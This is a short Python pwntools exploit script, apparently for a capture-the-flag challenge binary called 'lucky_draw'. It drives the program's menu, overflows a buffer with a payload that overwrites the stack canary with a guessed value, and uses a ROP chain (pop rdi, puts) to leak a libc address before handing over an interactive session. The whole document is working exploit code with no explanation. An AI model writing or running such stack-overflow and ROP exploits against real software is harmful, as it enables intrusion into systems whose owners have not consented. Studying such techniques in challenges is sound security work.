from pwn import *

def add(cnt, arr):
    r.sendlineafter("> ", b'1')
    r.sendlineafter("followers: ", str(cnt).encode())
    for i in arr:
        r.sendafter(": ", i)

def draw():
    r.sendlineafter("> ", b'2')

def winner(cont):
    r.sendlineafter("> ", b'3')
    r.sendafter("call: ", cont)

r = gdb.debug("./lucky_draw")
pop_rdi = 0x0000000000401336
puts_plt = 0x404028
puts = 0x401160
canary = b'A'*8
payload = p64(0)*5 + canary
payload += p64(0) + p64(pop_rdi) + p64(puts_plt)
payload += p64(puts)
payload = payload.ljust(0x848 - 5 * 8, b'\0') 
payload += p64(0x00000000404000)*3 + p64(0)*2 + canary
add(1, [payload])

leak = u64(r.recv(6).ljust(8,b'\0'))
log.info("PUTS LIBC: " + hex(leak))
r.interactive()